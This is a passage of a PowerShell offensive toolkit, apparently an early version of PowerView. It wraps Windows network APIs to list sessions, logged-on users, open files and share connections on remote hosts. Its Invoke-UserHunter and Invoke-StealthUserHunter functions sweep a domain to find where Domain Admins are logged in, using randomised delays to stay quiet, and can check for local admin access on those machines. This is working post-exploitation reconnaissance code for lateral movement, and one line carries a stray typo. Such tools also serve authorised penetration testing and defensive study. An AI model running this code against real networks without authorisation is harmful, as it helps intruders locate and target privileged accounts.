    $x = New-Object pinvoke.WKSTA_USER_INFO_1
    $type = $x.gettype()

    # Declare the reference variables
    $QueryLevel = 1
    $ptrInfo = 0 
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # actually execute the NetWkstaUserEnum api command
    $Result = [pinvoke.Win32Util]::NetWkstaUserEnum($HostName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

    Write-Verbose "Get-NetLoggedon result: $Result"

    # 0 = success
    if ($Result -eq 0){

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = [System.Runtime.Interopservices.Marshal]::SizeOf($x)

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = [system.runtime.interopservices.marshal]::PtrToStructure($newintptr,$type)
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment
        }
        # cleanup the ptr buffer
        $t = [pinvoke.Win32Util]::NetApiBufferFree($ptrInfo)
    }
    else 
    {
        switch ($Result) {
          (5)           {Write-Verbose "The user does not have access to the requested information."}
          (124)         {Write-Verbose "The value specified for the level parameter is not valid."}
          (87)          {Write-Verbose 'The specified parameter is not valid.'}
          (234)         {Write-Verbose 'More entries are available. Specify a large enough buffer to receive all entries.'}
          (8)           {Write-Verbose 'Insufficient memory is available.'}
          (2312)        {Write-Verbose 'A session does not exist with the computer name.'}
          (2351)        {Write-Verbose 'The computer name is not valid.'}
          (2221)        {Write-Verbose 'Username not found.'}
          (53)          {Write-Verbose 'Hostname could not be found'}
        }
    }
}


function Get-NetConnections {
    <#
    .SYNOPSIS
    Gets active connections to a server resource.
    
    .DESCRIPTION
    This function will execute the NetConnectionEnum Win32API call to query
    a given host for users connected to a particular resource.
    
    Note: only members of the Administrators or Account Operators local group 
    can successfully execute NetFileEnum

    .PARAMETER HostName
    The hostname to query.

    .PARAMETER Share
    The share to check connections to.

    .OUTPUTS
    CONNECTION_INFO_1  structure. A representation of the CONNECTION_INFO_1 
    result structure which includes the username host of connected users.

    .EXAMPLE
    > Get-NetConnections -HostName fileserver -Share secret
    Returns users actively connected to the share 'secret' on a fileserver.
    #>
    [CmdletBinding()]
    param(
        # default to querying the localhost if no name is supplied
        [string]$HostName = "localhost",
        [string]$Share = "C$"
    )

    # the custom FILE_INFO_3 result structure
    $FileInfoStructure = @'
namespace pinvoke {
using System;
using System.Runtime.InteropServices;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct CONNECTION_INFO_1
    {
        public uint coni1_id;
        public uint coni1_type;
        public uint coni1_num_opens;
        public uint coni1_num_users;
        public uint coni1_time;
        [MarshalAs(UnmanagedType.LPWStr)] public string coni1_username;
        [MarshalAs(UnmanagedType.LPWStr)] public string coni1_netname;
    }
}
'@

    # Add the custom structure
    Add-Type $FileInfoStructure

    $QueryLevel = 1
    $x = New-Object pinvoke.CONNECTION_INFO_1

    # Declare the reference variables
    $type = $x.gettype()

    $ptrInfo = 0 
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # actually execute the NetFilesEnum api command
    $Result = [pinvoke.Win32Util]::NetConnectionEnum($HostName, $Share, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

    Write-Verbose "Get-NetConnection result: $Result"

    # 0 = success
    if ($Result -eq 0){

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = [System.Runtime.Interopservices.Marshal]::SizeOf($x)

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = [system.runtime.interopservices.marshal]::PtrToStructure($newintptr,$type)
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment
        }
        # cleanup the ptr buffer
        $t = [pinvoke.Win32Util]::NetApiBufferFree($ptrInfo)
    }
    else 
    {
        switch ($Result) {
          (5)           {Write-Verbose "The user does not have access to the requested information."}
          (124)         {Write-Verbose "The value specified for the level parameter is not valid."}
          (87)          {Write-Verbose 'The specified parameter is not valid.'}
          (234)         {Write-Verbose 'More entries are available. Specify a large enough buffer to receive all entries.'}
          (8)           {Write-Verbose 'Insufficient memory is available.'}
          (2312)        {Write-Verbose 'A session does not exist with the computer name.'}
          (2351)        {Write-Verbose 'The computer name is not valid.'}
          (2221)        {Write-Verbose 'Username not found.'}
          (53)          {Write-Verbose 'Hostname could not be found'}
        }
    }

}

function Get-NetSessions {
    <#
    .SYNOPSIS
    Gets active sessions for a specified server.
    Heavily adapted from dunedinite's post on stackoverflow (see LINK below)

    .DESCRIPTION
    This function will execute the NetSessionEnum Win32API call to query
    a given host for active sessions on the host.

    .PARAMETER HostName
    The hostname to query for active sessions.

    .PARAMETER UserName
    The user name to query for active sessions.

    .OUTPUTS
    SESSION_INFO_10 structure. A representation of the SESSION_INFO_10
    result structure which includes the host and username associated
    with active sessions.

    .EXAMPLE
    > Get-NetSessions
    Returns active sessions on the local host.

    .EXAMPLE
    > Get-NetSessions -HostName sqlserver
    Returns active sessions on the 'sqlserver' host.

    .LINK
    http://stackoverflow.com/questions/12451246/working-with-intptr-and-marshaling-using-add-type-in-powershell
    #>
    
    [CmdletBinding()]
    param(
        # default to querying the localhost if no name is supplied
        [string]$HostName = "localhost",
        [string]$UserName = ""
    )

    # the custom SESSION_INFO_10 result structure
    $SessionInfoStructure = @'
namespace pinvoke {
using System;
using System.Runtime.InteropServices;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct SESSION_INFO_10
    {
        [MarshalAs(UnmanagedType.LPWStr)] public string sesi10_cname;
        [MarshalAs(UnmanagedType.LPWStr)] public string sesi10_username;
        public uint sesi10_time;
        public uint sesi10_idle_time;
    }
}
'@

    # Add the custom structure
    Add-Type $SessionInfoStructure

    $QueryLevel = 10
    $x = New-Object pinvoke.SESSION_INFO_10

    # Declare the reference variables
    $type = $x.gettype()

    $ptrInfo = 0 
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # actually execute the NetSessionEnum api command
    $Result = [pinvoke.Win32Util]::NetSessionEnum($HostName,"",$UserName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

    Write-Verbose "Get-NetSessions result: $Result"

    # 0 = success
    if ($Result -eq 0){

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = [System.Runtime.Interopservices.Marshal]::SizeOf($x)

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = [system.runtime.interopservices.marshal]::PtrToStructure($newintptr,$type)
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment
        }
        # cleanup the ptr buffer
        $t = [pinvoke.Win32Util]::NetApiBufferFree($ptrInfo)
    }
    else 
    {
        switch ($Result) {
          (5)           {Write-Verbose  "The user does not have access to the requested information."}
          (124)         {Write-Verbose "The value specified for the level parameter is not valid."}
          (87)          {Write-Verbose 'The specified parameter is not valid.'}
          (234)         {Write-Verbose 'More entries are available. Specify a large enough buffer to receive all entries.'}
          (8)           {Write-Verbose 'Insufficient memory is available.'}
          (2312)        {Write-Verbose 'A session does not exist with the computer name.'}
          (2351)        {Write-Verbose 'The computer name is not valid.'}
          (2221)        {Write-Verbose 'Username not found.'}
          (53)          {Write-Verbose 'Hostname could not be found'}
        }
    }
}


function Get-NetFiles {
    <#
    .SYNOPSIS
    Get files opened on a remote server.

    .DESCRIPTION
    This function will execute the NetFileEnum Win32API call to query
    a given host for information about open files. 

    Note: only members of the Administrators or Account Operators local group 
    can successfully execute NetFileEnum

    .PARAMETER HostName
    The hostname to query for open files.

    .PARAMETER TargetUser
    Return files open only from this particular user.

    .PARAMETER TargetHost
    Return files open only from this particular host.

    .OUTPUTS
    FILE_INFO_3 structure. A representation of the FILE_INFO_3
    result structure which includes the host and username associated
    with active sessions.

    .EXAMPLE
    > Get-NetFiles -HostName fileserver
    Returns open files/owners on fileserver.

    .EXAMPLE
    > Get-NetFiles -HostName fileserver -TargetUser john
    Returns files opened on fileserver by 'john'
   
    .EXAMPLE
    > Get-NetFiles -HostName fileserver -TargetHost 192.168.1.100
    Returns files opened on fileserver from host 192.168.1.100
    #>
    
    [CmdletBinding()]
    param(
        # default to querying the localhost if no name is supplied
        [string]$HostName = "localhost",
        [string]$TargetUser = "",
        [string]$TargetHost = ""
    )

    # if a target host is specified, format/replace variables
    if ($TargetHost -ne ""){
        $TargetUser = "\\$TargetHost"
    }
    
    # the custom FILE_INFO_3 result structure
    $FileInfoStructure = @'
namespace pinvoke {
using System;
using System.Runtime.InteropServices;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct FILE_INFO_3
    {
        public uint fi3_id;
        public uint fi3_permissions;
        public uint fi3_num_locks;
        [MarshalAs(UnmanagedType.LPWStr)] public string fi3_pathname;
        [MarshalAs(UnmanagedType.LPWStr)] public string fi3_username;
    }
}
'@

    # Add the custom structure
    Add-Type $FileInfoStructure

    $QueryLevel = 3
    $x = New-Object pinvoke.FILE_INFO_3

    # Declare the reference variables
    $type = $x.gettype()

    $ptrInfo = 0 
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # actually execute the NetFilesEnum api command
    $Result = [pinvoke.Win32Util]::NetFileEnum($HostName,"",$TargetUser, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

    Write-Verbose "Get-NetFiles result: $Result"

    # 0 = success
    if ($Result -eq 0){

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = [System.Runtime.Interopservices.Marshal]::SizeOf($x)

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = [system.runtime.interopservices.marshal]::PtrToStructure($newintptr,$type)
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment
        }
        # cleanup the ptr buffer
        $t = [pinvoke.Win32Util]::NetApiBufferFree($ptrInfo)
    }
    else 
    {
        switch ($Result) {
          (5)           {Write-Verbose  "The user does not have access to the requested information."}
          (124)         {Write-Verbose "The value specified for the level parameter is not valid."}
          (87)          {Write-Verbose 'The specified parameter is not valid.'}
          (234)         {Write-Verbose 'More entries are available. Specify a large enough buffer to receive all entries.'}
          (8)           {Write-Verbose 'Insufficient memory is available.'}
          (2312)        {Write-Verbose 'A session does not exist with the computer name.'}
          (2351)        {Write-Verbose 'The computer name is not valid.'}
          (2221)        {Write-Verbose 'Username not found.'}
          (53)          {Write-Verbose 'Hostname could not be found'}
        }
    }
}


function Invoke-CheckLocalAdminAccess {
    <#
    .SYNOPSIS
    Checks if the current user context has local administrator access
    to a specified host or IP.

    Idea stolen from the local_admin_search_enum post module in 
    Metasploit written by:
        'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
        'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
        'Royce Davis "r3dy" <rdavis[at]accuvant.com>'
    
    .DESCRIPTION
    This function will use the OpenSCManagerA Win32API call to to establish
    a handle to the remote host. If this succeeds, the current user context
    has local administrator acess to the target.

    .PARAMETER HostName
    The hostname to query for active sessions.

    .OUTPUTS
    $true if the current user has local admin access to the hostname,
    $false otherwise

    .EXAMPLE
    > Invoke-CheckLocalAdminAccess -HostName sqlserver
    Returns active sessions on the local host.

    .LINK
    https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] [string]$HostName
    )

    # 0xF003F - SC_MANAGER_ALL_ACCESS
    #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
    $handle = [pinvoke.Win32Util]::OpenSCManagerW("\\$HostName", "ServicesActive", 0xF003F)

    Write-Verbose "Invoke-CheckLocalAdminAccess handle: $handle"

    # if we get a non-zero handle back, everything was successful
    if ($handle -ne 0){
        # Close off the service handle
        $t = [pinvoke.Win32Util]::CloseServiceHandle($handle)
        $true
    }
    # otherwise it failed
    else{
        $err = [pinvoke.Win32Util]::GetLastError()
        Write-Verbose "Invoke-CheckLocalAdminAccess LastError: $err"
        $false
    }
}


function Invoke-Netview {
    <#
    .SYNOPSIS
    Gets information for each found host on the local domain.
    Original functionality was implemented in the netview.exe tool
    released by Rob Fuller (@mubix). See links for more information.

    Powershell module author: @harmj0y
    
    .DESCRIPTION
    This is a port of Mubix's netview.exe tool. It finds the local domain name
    for a host using Get-NetDomain, reads in a host list or queries the domain 
    for all active machines with Get-NetServers, randomly shuffles the host list, 
    then for each target server it runs  Get-NetSessions, Get-NetLoggedon, 
    and Get-NetShare to enumerate each target host.

    .PARAMETER ExcludeShares
    Exclude common shares from display (C$, IPC$, etc.)

    .PARAMETER CheckShareAccess
    Only display found shares that the local user has access to.

    .PARAMETER Ping
    Ping each host to ensure it's up before enumerating.

    .PARAMETER Shuffle
    Shuffle the host list before before enumerating.

    .PARAMETER HostList
    List of hostnames/IPs enumerate.

    .PARAMETER Delay
    Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter
    Jitter for the host delay, defaults to +/- 0.3

    .EXAMPLE
    > Invoke-Netview
    Run all Netview functionality and display the output.

    .EXAMPLE
    > Invoke-Netview -Delay 60
    Run all Netview functionality with a 60 second (+/- *.3) randomized
    delay between touching each host.

    .EXAMPLE
    > Invoke-Netview -Delay 10 -HostList hosts.txt
    Runs Netview on a pre-populated host list with a 10 second (+/- *.3) 
    randomized delay between touching each host.

    .EXAMPLE
    > Invoke-Netview -Ping
    Runs Netview and pings hosts before eunmerating them.

    .LINK
    https://github.com/mubix/netview
    www.room362.com/blog/2012/10/07/compiling-and-release-of-netview/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)] [Switch] $ExcludeShares,
        [Parameter(Mandatory = $False)] [Switch] $CheckShareAccess,
        [Parameter(Mandatory = $False)] [Switch] $Ping,
        [Parameter(Mandatory = $False)] [Switch] $Shuffle,
        [UInt32]$Delay = 0,
        [UInt32]$Jitter = .3,
        [string]$HostList = ""
    )

    # shares we want to ignore if the flag is set
    $excludedShares = @("", "ADMIN$", "IPC$", "C$", "PRINT$")

    # get the local domain
    $domain = Get-NetDomain

    # random object for delay
    $randNo = New-Object System.Random

    # the array for our initial status output messages
    $statusOutput = @()

    $statusOutput += "`r`nRunning Netview with delay of $Delay`r`n"
    $statusOutput += "[+] Domain: $domain"

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList -ne ""){
        $servers = @()
        if (Test-Path $HostList){
            foreach ($Item in Get-Content $HostList) {
                if (($Item -ne $null) -and ($Item.trim() -ne "")){
                    $servers += $Item
                }
            }
        }
        else {
            Write-Warning "[!] Input file '$HostList' doesn't exist!"
            $statusOutput += "[!] Input file '$HostList' doesn't exist!"
            return $statusOutput
        }
    }
    else{
        # otherwise, query the domain for target servers
        $statusOutput += "[*] Querying domain for hosts...`r`n"
        $servers = Get-NetServers
    }

    # randomize the server list if specified
    if ($Shuffle) {
        $servers = Get-ShuffledArray $servers
    }

    # TODO: revamp code to search for SQL servers and backup DCs
    # $SQLServers = Get-NetServers -ServerType 4
    $DomainControllers = Get-NetDomainControllers
    # $BackupDomainControllers = Get-NetServers -ServerType 16

    $HostCount = $servers.Count
    $statusOutput += "[+] Total number of hosts: $HostCount`n"

    if (($DomainControllers -ne $null) -and ($DomainControllers.count -ne 0)){
        foreach ($DC in $DomainControllers){
            $statusOutput += "[+] Domain Controller: $DC"
        }
    }

    # return/output the initial status output
    $statusOutput

    foreach ($server in $servers){

        # start a new status output array for each server
        $serverOutput = @()

        # make sure we have a server
        if (($server -ne $null) -and ($server.trim() -ne "")){

            $ip = Get-HostIP -hostname $server

            # make sure the IP resolves
            if ($ip -ne ""){
                # sleep for our semi-randomized interval
                Start-Sleep $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                
                $serverOutput += "`r`n[+] Server: $server"
                $serverOutput += "[+] IP: $ip"

                # optionally check if the server is up first
                $up = $true
                if($ping){
                    $up = Test-Server -Server $server
                }
                if ($up){

                    # get active sessions for this host and display what we find
                    $sessions = Get-NetSessions -HostName $server
                    foreach ($session in $sessions) {
                        $username = $session.sesi10_username
                        $cname = $session.sesi10_cname
                        $activetime = $session.sesi10_time
                        $idletime = $session.sesi10_idle_time
                        # make sure we have a result
                        if (($username -ne $null) -and ($username.trim() -ne "")){
                            $serverOutput += "[+] $server - Session - $username from $cname - Active: $activetime - Idle: $idletime"
                        }
                    }

                    # get any logged on users for this host and display what we find
                    $users = Get-NetLoggedon -HostName $server
                    foreach ($user in $users) {
                        $username = $user.wkui1_username
                        $domain = $user.wkui1_logon_domain

                        if ($username -ne $null){
                            # filter out $ machine accounts
                            if ( !$username.EndsWith("$") ) {
                                $serverOutput += "[+] $server - Logged-on - $domain\\$username"
                            }
                        }
                    }

                    # get the shares for this host and display what we find
                    $shares = Get-NetShare -HostName $server
                    foreach ($share in $shares) {
                        if ($share -ne $null){
                            $netname = $share.shi1_netname
                            $remark = $share.shi1_remark
                            $path = "\\"+$server+"\"+$netname

                            # check if we're filtering out common shares
                            if ($ExcludeShares.IsPresent){
                                if (($netname) -and ($netname.trim() -ne "") -and ($excludedShares -notcontains $netname)){
                                    
                                    # see if we want to test for access to the found
                                    if($CheckShareAccess){
                                        # check if the user has access to this path
                                        try{
                                            $f=[IO.Directory]::GetFiles($path)
                                            $serverOutput += "[+] $server - Share: $netname `t: $remark"
                                        }
                                        catch {}

                                    }
                                    else{
                                        $serverOutput += "[+] $server - Share: $netname `t: $remark"
                                    }

                                }  
                            }
                            # otherwise, display all the shares
                            else {
                                if (($netname) -and ($netname.trim() -ne "")){

                                    # see if we want to test for access to the found
                                    if($CheckShareAccess){
                                        # check if the user has access to this path
                                        try{
                                            $f=[IO.Directory]::GetFiles($path)
                                            $serverOutput += "[+] $server - Share: $netname `t: $remark"
                                        }
                                        catch {}
                                    }
                                    else{
                                        $serverOutput += "[+] $server - Share: $netname `t: $remark"
                                    }
                                }
                            }

                        }
                    }

                }
            }
        }
        # return/output this server's output
        $serverOutput
    }
}


function Invoke-UserHunter {
    <#
    .SYNOPSIS
    Finds which machines users of a specified group are logged into.
    Author: @harmj0y
    
    .DESCRIPTION
    This function finds the local domain name for a host using Get-NetDomain,
    queries the domain for users of a specified group (default "domain admins")
    with Get-NetGroup or reads in a target user list, queries the domain for all 
    active machines with Get-NetServers or reads in a pre-populated host list,
    randomly shuffles the target list, then for each server it gets a list of 
    active users with Get-NetSessions/Get-NetLoggedon. The found user list is compared 
    against the target list, and a status message is displayed for any hits. 
    The flag -CheckAccess will check each positive host to see if the current 
    user has local admin access to the machine.

    .PARAMETER GroupName
    Group name to query for target users.

    .PARAMETER UserName
    Specific username to search for.

    .PARAMETER UserList
    List of usernames to search for.

    .PARAMETER HostList
    List of hostnames/IPs to search.

    .PARAMETER Ping
    Ping each host to ensure it's up before enumerating.

    .PARAMETER Shuffle
    Shuffle the host list before before enumerating.

    .PARAMETER CheckAccess
    Check if the current user has local admin access to found machines.

    .PARAMETER Delay
    Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter
    Jitter for the host delay, defaults to +/- 0.3

    .EXAMPLE
    > Invoke-UserHunter
    Finds machines on the local domain where domain admins are logged into.

    .EXAMPLE
    > Invoke-UserHunter -CheckAccess
    Finds machines on the local domain where domain admins are logged into
    and checks if the current user has local administrator access.

    .EXAMPLE
    > Invoke-UserHunter -UserList users.txt -HostList hosts.txt
    Finds machines in hosts.txt where any members of users.txt are logged in
    or have sessions.

    .EXAMPLE
    > Invoke-UserHunter -GroupName "Power Users" -Delay 60
    Find machines on the domain where members of the "Power Users" groups are 
    logged into with a 60 second (+/- *.3) randomized delay between 
    touching each host.

    .EXAMPLE
    > Invoke-UserHunter -UserName jsmith -CheckAccess
    Find machines on the domain where jsmith is logged into and checks if 
    the current user has local administrator access.

    .LINK
    harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [string]$GroupName = "Domain Admins",
        [string]$UserName = "",
        [Parameter(Mandatory = $False)] [Switch] $CheckAccess,
        [Parameter(Mandatory = $False)] [Switch] $Ping,
        [Parameter(Mandatory = $False)] [Switch] $Shuffle,
        [UInt32]$Delay = 0,
        [UInt32]$Jitter = .3,
        [string]$HostList = "",
        [string]$UserList = ""
    )

    # users we're going to be searching for
    $TargetUsers = @()

    # random object for delay
    $randNo = New-Object System.Random

    # get the current user
    $CurrentUser = Get-NetCurrentUser

    $domain = Get-NetDomain

    # the array for our initial status output messages
    $statusOutput = @()

    $statusOutput += "`r`n[*] Running UserHunter on domain $domain with delay of $Delay"

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList -ne ""){
        $servers = @()
        if (Test-Path $HostList){
            foreach ($Item in Get-Content $HostList) {
                if (($Item -ne $null) -and ($Item.trim() -ne "")){
                    $servers += $Item
                }
            }
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            $statusOutput += "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $statusOutput
        }
    }
    else{
        # otherwise, query the domain for target servers
        $statusOutput += "[*] Querying domain for hosts...`r`n"
        $servers = Get-NetServers
    }

    # randomize the server array if specified
    if ($shuffle){
        $servers = Get-ShuffledArray $servers
    }

    # if we get a specific username, only use that
    if ($UserName -ne ""){
        $statusOutput += "`r`n[*] Using target user '$UserName'..."
        $TargetUsers += $UserName.ToLower()
    }
    else{
        # read in a target user list if we have one
        if($UserList -ne ""){
            $TargetUsers = @()
            # make sure the list exists
            if (Test-Path $UserList){
                foreach ($Item in Get-Content $UserList) {
                    if (($Item -ne $null) -and ($Item.trim() -ne "")){
                        $TargetUsers += $Item
                    }
                }     
            }
            else {
                Write-Warning "`r`n[!] Input file '$UserList' doesn't exist!`r`n"
                $statusOutput += "`r`n[!] Input file '$UserList' doesn't exist!`r`n"
                return $statusOutput
            }
        }
        else{
            # otherwise default to the group name to query for target users
            $statusOutput += "`r`n[*] Querying domain group '$GroupName' for target users..."
            $temp = Get-NetGroup -GroupName $GroupName
            # lower case all of the found usernames
            $TargetUsers = $temp | % {$_.ToLower() }
        }
    }

    if (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0)){
        Write-Warning "`r`n [!] No users found to search for!"
        $statusOutput += "`r`n [!] No users found to search for!"
        return $statusOutput
    }

    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        $statusOutput += "`r`n[!] No hosts found!"
        return $statusOutput
    }

    $serverCount = $servers.count
    $statusOutput += "`r`n[*] Enumerating $serverCount servers..."

    # write out the current status output
    $statusOutput

    foreach ($server in $servers){

        # start a new status output array for each server
        $serverOutput = @()

        # make sure we get a server name
        if ($server -ne ""){
            # sleep for our semi-randomized interval
            Start-Sleep $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            # optionally check if the server is up first
            $up = $true
            if($ping){
                $up = Test-Server -Server $server
            }
            if ($up){
                # get active sessions and see if there's a target user there
                $sessions = Get-NetSessions -HostName $server
                foreach ($session in $sessions) {
                    $username = $session.sesi10_username
                    $cname = $session.sesi10_cname
                    $activetime = $session.sesi10_time
                    $idletime = $session.sesi10_idle_time

                    # make sure we have a result
                    if (($username -ne $null) -and ($username.trim() -ne "")){
                        # if the session user is in the target list, display some output
                        if ($TargetUsers -contains $username){
                            $ip = Get-HostIP -hostname $server
                            $serverOutput += "[+] Target user '$username' has a session on $server ($ip) from $cname"

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess.IsPresent){
                                if (Invoke-CheckLocalAdminAccess -Hostname $cname){
                                    $serverOutput += "[+] Current user '$CurrentUser' has local admin access on $cname !"
                                }
                            }
                        }
                    }
                }

                # get any logged on users and see if there's a target user there
                $users = Get-NetLoggedon -HostName $server
                foreach ($user in $users) {
                    $username = $user.wkui1_username
                    $domain = $user.wkui1_logon_domain

                    if (($username -ne $null) -and ($username.trim() -ne "")){
                        # if the session user is in the target list, display some output
                        if ($TargetUsers -contains $username){
                            $ip = Get-HostIP -hostname $server
                            # see if we're checking to see if we have local admin access on this machine
                            $serverOutput += "[+] Target user '$username' logged into $server ($ip)"

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess.IsPresent){
                                if (Invoke-CheckLocalAdminAccess -Hostname $ip){
                                    $serverOutput +=t "[+] Current user '$CurrentUser' has local admin access on $ip !"
                                }
                            }
                        }
                    }
                }
            }
        }
        # return/output this server's status array
        $serverOutput
    }
}


function Invoke-StealthUserHunter {
    <#
    .SYNOPSIS
    Finds where users are logged into by checking the sessions
    on common file servers.

    Author: @harmj0y
    
    .DESCRIPTION
    This function issues one query on the domain to get users of a target group,
    issues one query on the domain to get all user information, extracts the 
    homeDirectory for each user, creates a unique list of servers used for 
    homeDirectories (i.e. file servers), and runs Get-NetSessions against the target 
    servers. Found users are compared against the users queried from the domain group,
    or pulled from a pre-populated user list. Significantly less traffic is generated 
    on average compared to Invoke-UserHunter, but not as many hosts are covered.

    .PARAMETER GroupName
    Group name to query for target users.

    .PARAMETER UserName
    Specific username to search for.

    .PARAMETER UserList
    List of usernames to search for.

    .PARAMETER Shuffle
    Shuffle the file server list before before enumerating.

    .PARAMETER CheckAccess
    Check if the current user has local admin access to found machines.

    .PARAMETER Ping
    Ping each host to ensure it's up before enumerating.

    .PARAMETER Delay
    Delay between enumerating fileservers, defaults to 0

    .PARAMETER Jitter
    Jitter for the fileserver delay, defaults to +/- 0.3

    .EXAMPLE
    > Invoke-StealthUserHunter
    Finds machines on the local domain where domain admins have sessions from.

    .EXAMPLE
    > Invoke-StealthUserHunter -UserList users.txt
    Finds machines on the local domain where users from a specified list have
    sessions from.

    .EXAMPLE
    > Invoke-StealthUserHunter -CheckAccess
    Finds machines on the local domain where domain admins have sessions from
    and checks if the current user has local administrator access to those 
    found machines.

    .EXAMPLE
    > Invoke-StealthUserHunter -GroupName "Power Users" -Delay 60
    Find machines on the domain where members of the "Power Users" groups  
    have sessions with a 60 second (+/- *.3) randomized delay between 
    touching each file server.

    .EXAMPLE
    > Invoke-StealthUserHunter -UserName jsmith -CheckAccess
    Find machines on the domain where jsmith has a session from and checks if 
    the current user has local administrator access to those found machines.

    .LINK
    harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [string]$GroupName = "Domain Admins",
        [string]$UserName = "",
        [Parameter(Mandatory = $False)] [Switch] $CheckAccess,
        [Parameter(Mandatory = $False)] [Switch] $Ping,
        [Parameter(Mandatory = $False)] [Switch] $Shuffle,
        [UInt32]$Delay = 0,
        [UInt32]$Jitter = .3,
        [string]$HostList = "",
        [string]$UserList = ""
    )

    # users we're going to be searching for
    $TargetUsers = @()

    # resulting file servers to query
    $FileServers = @()

    # random object for delay
    $randNo = New-Object System.Random

    # get the current user
    $CurrentUser = Get-NetCurrentUser

    $domain = Get-NetDomain

    # the array for our initial status output messages
    $statusOutput = @()

    $statusOutput += "`r`n[*] Running StealthUserHunter on domain $domain with delay of $Delay"

    # if we get a specific username, only use that
    if ($UserName -ne ""){
        $statusOutput +=  "`r`n[*] Using target user '$UserName'..."
        $TargetUsers += $UserName.ToLower()
    }
    else{
        # read in a target user list if we have one
        if($UserList -ne ""){
            $TargetUsers = @()
            # make sure the list exists
            if (Test-Path $UserList){
                foreach ($Item in Get-Content $UserList) {
                    if (($Item -ne $null) -and ($Item.trim() -ne "")){
                        $TargetUsers += $Item
                    }
                }     
            }
            else {
                Write-Warning "`r`n[!] Input file '$UserList' doesn't exist!`r`n" 
                $statusOutput +=  "`r`n[!] Input file '$UserList' doesn't exist!`r`n" 
                return $statusOutput
            }
        }
        else{
            # otherwise default to the group name to query for target users
            $statusOutput += "`r`n[*] Querying domain group '$GroupName' for target users..."
            $temp = Get-NetGroup -GroupName $GroupName
            # lower case all of the found usernames
            $TargetUsers = $temp | % {$_.ToLower() }
        }
    }

    if (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0)){
        Write-Warning "`r`n [!] No users found to search for!"
        $statusOutput += "`r`n [!] No users found to search for!"
        return $statusOutput
    }

    # get the file server list
    [Array]$FileServers  = Get-NetFileServers

    # randomize the fileserver array if specified
    if ($shuffle){
        [Array]$FileServers = Get-ShuffledArray $FileServers
    }

    # error checking
    if (($FileServers -eq $null) -or ($FileServers.count -eq 0)){
        $statusOutput += "`r`n[!] No fileservers found in user home directories!"
        return $statusOutput
    }
    else{

        $n = $FileServers.count
        $statusOutput += "[*] Found "+$n+" fileservers`n"

        # return/output the current status lines
        $statusOutput

        # iterate through each target file server
        foreach ($server in $FileServers){

            Write-Verbose "[*] Enumerating file server $server"

            # start a new status output array for each server
            $serverOutput = @()

            # sleep for our semi-randomized interval
            Start-Sleep $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            # optionally check if the server is up first
            $up = $true
            if($ping){
                $up = Test-Server -Server $server
            }
            if ($up){
                # grab all the sessions for this fileserver
                $sessions = Get-NetSessions $server
                
                # search through all the sessions for a target user
                foreach ($session in $sessions) {
                    Write-Verbose "[*] Session: $session"
                    # extract fields we care about
                    $username = $session.sesi10_username
                    $cname = $session.sesi10_cname
